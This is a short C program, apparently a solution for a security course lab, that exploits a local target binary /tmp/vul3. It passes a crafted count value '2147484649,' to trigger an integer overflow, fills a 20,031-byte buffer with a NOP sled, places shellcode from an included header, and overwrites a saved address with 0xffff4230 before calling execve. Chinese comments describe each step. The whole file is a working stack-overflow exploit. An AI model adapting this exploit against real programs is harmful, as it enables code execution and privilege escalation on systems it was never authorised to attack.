#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul3"

int main(void)
{
	char* count = "2147484649,";//11

	char payload[20031];
	//初始化，全部置为nop
	memset(payload, '\x90', 20031);
	//count
	memcpy(payload, count, 11);

	//将shellcode复制到payload中
	memcpy(payload+64+11, shellcode, 25);
	
	//最后4个字节改为shellcode(buff64)地址ffff4230
	memcpy(payload+20004+11, "\x30\x42\xff\xff", 4);
	
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

